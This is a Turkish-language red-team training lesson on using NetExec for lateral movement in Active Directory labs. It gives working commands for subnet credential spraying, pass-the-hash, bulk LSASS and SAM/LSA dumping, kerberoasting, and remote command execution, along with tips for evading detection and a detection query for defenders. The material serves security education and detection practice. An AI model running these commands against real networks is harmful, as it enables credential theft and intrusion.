## 1. Kavramsal Temel — Neden Var?

Tek tek `psexec`/`wmiexec` çalıştırmak 200 makineli bir ağda pratik değildir. **NetExec (nxc)** — eski CrackMapExec'in devamı — yanal hareketin **İsviçre çakısıdır**:

> **NetExec, tek bir kimlikle bütün bir ağ aralığını (subnet) tarayıp "bu kimlik nerede geçerli, nerede yerel admin, nereden ne çalınabilir" sorularını saniyeler içinde yanıtlar. Çok protokol (SMB/WinRM/LDAP/MSSQL/RDP/SSH/WMI) + çok kimlik türü (parola/hash/bilet) + yüzlerce modülü tek arayüzde birleştirir. Yanal hareketi "el işi"nden "endüstriyel"e taşır.**

Bu güç, aynı zamanda **en büyük OPSEC riskidir**: bir `/24`'e karşı çalıştırılan tek komut, kısa sürede yüzlerce 4624/4625 üretir → gürültü zirvesi. Araç güçlüdür; kullananın disiplinli olması gerekir.

**Analoji:** NetExec = tüm kapıları aynı anda deneyen bir maymuncuk seti. Verimli ama sesli; alarmı olan bir binada hepsini birden denemek yakalanmanın en hızlı yoludur.

## 2. Teknik Derinlik — Mimari ve "Pwn3d!" Mantığı

### 2.1 Protokol modülleri ve ne sağlarlar

```
   nxc <protocol> <hedef> <kimlik> [seçenekler]
   ┌────────────────────────────────────────────────────────────┐
   │ smb   → oturum, paylaşım, yerel admin, dump, spider          │
   │ ldap  → BloodHound, kerberoast, asreproast, delegation, gMSA │
   │ winrm → uzak komut yürütme                                    │
   │ mssql → DB kimlik doğrulama, xp_cmdshell                      │
   │ rdp   → NLA testi, ekran görüntüsü                            │
   │ ssh / wmi / ftp / vnc …                                       │
   └────────────────────────────────────────────────────────────┘
```

### 2.2 "Pwn3d!" nasıl belirlenir?

`nxc smb` bir kimliği doğruladıktan sonra, hedefte **yerel admin** olup olmadığını anlamak için ayrıcalıklı bir işlem (varsayılan: `\\host\ADMIN$`'e erişim veya SCM sorgusu) dener. Başarılıysa çıktıya **`(Pwn3d!)`** ekler:

```
SMB  10.10.10.42  445  WS042  [+] corp.local\jsmith:Welcome1 (Pwn3d!)   ← yerel admin
SMB  10.10.10.60  445  SRV60  [+] corp.local\jsmith:Welcome1            ← geçerli ama admin değil
SMB  10.10.10.99  445  WS099  [-] corp.local\jsmith:Welcome1 STATUS_LOGON_FAILURE
```

Bu tek satır, tüm yanal-hareket haritanı verir: `(Pwn3d!)` olan her makine bir sonraki sıçrama noktasıdır.

### 2.3 Modül ekosistemi (`-M`)

NetExec yüzlerce `-L` ile listelenebilen modül taşır: `-M lsassy` (LSASS dump), `-M gpp_password`, `-M spider_plus` (paylaşım tarama), `-M nanodump`, `-M zerologon`, `-M petitpotam`. Tek arayüzden keşiften sömürüye zincir kurar.

### 2.4 Kimlik türü matrisi — tek sözdizimi, çok materyal

```
   -p 'parola'          → düz parola
   -H <NThash>          → Pass-the-Hash
   -k / --use-kcache    → Kerberos bilet (KRB5CCNAME)
   --aesKey <key>       → AES anahtarı (OPtH; RC4 anomalisinden kaç)
   --local-auth         → yerel hesap (domain değil; RID-500 senaryosu)
   → Aynı komut yapısı: keşifte bulduğun HER materyal türünü doğrudan besleyebilirsin.
```

### 2.5 Neden CrackMapExec değil NetExec?

CrackMapExec (CME) 2023'te bakımı bıraktı; **NetExec (nxc)** aktif çatalıdır — güncel protokoller, modüller ve hata düzeltmeleri burada. Eski CME komutları çoğunlukla `cme` → `nxc` değişimiyle çalışır. Modern engagement'ta nxc kullan.

## 3. Pratik Uygulama — Otomasyon Akışları

### 3.1 Kimlik doğrulama ve yerel-admin haritalama

```bash
# Parola / hash / bilet — hepsi aynı sözdizimi
nxc smb 10.10.10.0/24 -u jsmith -p 'Welcome1'                 # tüm subnet
nxc smb 10.10.10.0/24 -u administrator -H 31d6c...089c0       # PtH ile
nxc smb 10.10.10.0/24 -u administrator -k                     # bilet ile
nxc smb targets.txt   -u jsmith -p 'Welcome1' | grep 'Pwn3d!' # sadece admin olduklarım
```

### 3.2 Toplu kimlik hasadı (admin olunan yerlerde)

```bash
# Pwn3d! olan tüm makinelerde LSASS dump (dikkat: çok gürültülü)
nxc smb targets_pwned.txt -u administrator -H <hash> -M lsassy
# SAM + cached creds + LSA secrets
nxc smb 10.10.10.42 -u administrator -H <hash> --sam --lsa --dpapi
# Paylaşımlarda parola/anahtar avı
nxc smb 10.10.10.0/24 -u jsmith -p 'Welcome1' -M spider_plus --share 'SYSVOL'
```

### 3.3 LDAP tarafı (keşif + roast tek araçta)

```bash
nxc ldap 10.10.10.5 -u jsmith -p 'Welcome1' --kerberoasting kerb.txt
nxc ldap 10.10.10.5 -u jsmith -p 'Welcome1' --asreproast asrep.txt
nxc ldap 10.10.10.5 -u jsmith -p 'Welcome1' --bloodhound -c All -ns 10.10.10.5
nxc ldap 10.10.10.5 -u jsmith -p 'Welcome1' --gmsa            # gMSA parolaları (yetki varsa)
```

### 3.4 Komut yürütme ve pivot

```bash
nxc smb 10.10.10.42 -u administrator -H <hash> -x "whoami /all"          # cmd
nxc winrm 10.10.10.42 -u administrator -H <hash> -X "Get-Process"        # PowerShell
nxc mssql 10.10.10.60 -u sa -p 'Sql!' --local-auth -x "whoami"           # xp_cmdshell
```

### 3.5 RDP / oturum keşfi ve ekran görüntüsü

```bash
# RDP açık + NLA durumu + kimlik geçerliliği (yanal hareket için RDP hedefleri)
nxc rdp 10.10.10.0/24 -u administrator -H <hash>
nxc rdp 10.10.10.42 -u administrator -H <hash> --screenshot     # masaüstü önizleme
# Kimin nerede oturumu açık (LSASS avı hedefi)
nxc smb 10.10.10.0/24 -u jsmith -p 'Welcome1' --loggedon-users --sessions
```

### 3.6 Kimlik veritabanı (nxc'nin hafızası)

```bash
# nxc bulduğu her kimliği/host'u yerel DB'de tutar → sonraki komutlarda otomatik kullanır
nxcdb
#  workspace> proto smb ; creds       → topladığın tüm kimlikler
#  hosts / shares / loggedon_users    → biriken keşif
```

**OPSEC notları:**
- **`/24` taraması = havai fişek gösterisi.** Tek komut yüzlerce oturum olayı üretir; UEBA/SIEM için "yatay tarama" en klasik yanal-hareket imzasıdır ([Blue 04.1](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.1_Anormal_Oturum_Acma_Analizi.md)). BloodHound ([01.2](../Modul_01_Kesif_ve_Numaralandirma/01.2_SharpHound_ve_BloodHound.md)) ile **önceden nereye gideceğini bil**, sonra tek hedefe git — kör tarama yapma.
- **`--jitter` / hedef listesi daralt:** Geniş aralık yerine `targets.txt` (yalnızca ilgilenilen host'lar), aralara gecikme. "Low and slow" yanal harekette de geçerlidir.
- **`-M lsassy` toplu dump** özellikle tehlikelidir — 20 makinede eşzamanlı Sysmon 10 = kesin alarm. Yalnızca kritik, seçili host'larda kullan.
- **nxc kimlik DB'si** operasyonel kolaylık sağlar ama toplanan tüm kimlikleri tek yerde tutar — engagement bitince güvenli sil (raporlama sonrası).
- Honeytoken hesaplar/paylaşımlar ([Blue 04.4](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.4_Honeytoken_ve_Honey_Account.md)) taramanı "cazip" tuzaklara çeker; `(Pwn3d!)` olan şüpheli-kolay bir hedef tuzak olabilir.

## 5. Doğrulama / Lab

```bash
# 1) Lab /24'e karşı nxc smb çalıştır, Pwn3d! haritasını çıkar
nxc smb 10.10.10.0/24 -u jsmith -p 'Welcome1' | grep Pwn3d
# 2) Blue: aynı anda DC'de 4624 Type 3 hacim zirvesini gözle (tek kaynak IP)
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 200 |
  ? { $_.Message -match 'Logon Type:\s+3' } | Group-Object { ($_.Properties[18].Value) }
# 3) Hedefi targets.txt'ye daralt + jitter ile tekrarla → olay hacminin düştüğünü gör
```
